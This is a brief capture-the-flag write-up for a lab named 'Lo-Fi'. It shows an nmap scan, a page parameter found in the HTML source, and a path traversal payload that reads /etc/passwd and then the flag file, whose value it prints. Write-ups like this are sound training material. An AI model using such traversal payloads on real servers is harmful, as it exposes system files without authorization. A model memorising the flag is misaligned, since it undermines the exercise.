# Lo-Fi

# Task : Climb the filesystem to find the flag!

'''
flag{e4478e0eab69bd642b8238765dcb7d18}
'''


# Method.

Nmap Scan

nmap -sC -sV -oN nScan http://10.10.70.38            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 01:21 EDT
Unable to split netmask from target expression: "http://10.10.70.38"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.18 seconds
                                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -oN nScan 10.10.70.38 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 01:21 EDT
Nmap scan report for 10.10.70.38
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0b:df:b6:10:35:b8:6e:31:28:d1:d1:dd:6f:0e:c8:b6 (RSA)
|   256 b8:bc:87:7c:e7:06:f3:2d:0f:cd:45:de:09:82:47:17 (ECDSA)
|_  256 05:ca:f3:c3:89:0a:10:27:74:8d:38:71:12:a2:0c:d3 (ED25519)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Lo-Fi Music
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds


1. Went directly to http://10.10.70.38
2. On the main page i did view page source and saw this:

<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>    
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>

haha its Local File Inclusion (LFI)  vulnerability

did http://10.10.70.38/?page=../../../../../etc/passwd
and it did work...

so 
after multiple try i got hold on to the flag in:
http://10.10.70.38/?page=../../../../../flag.txt

ggs
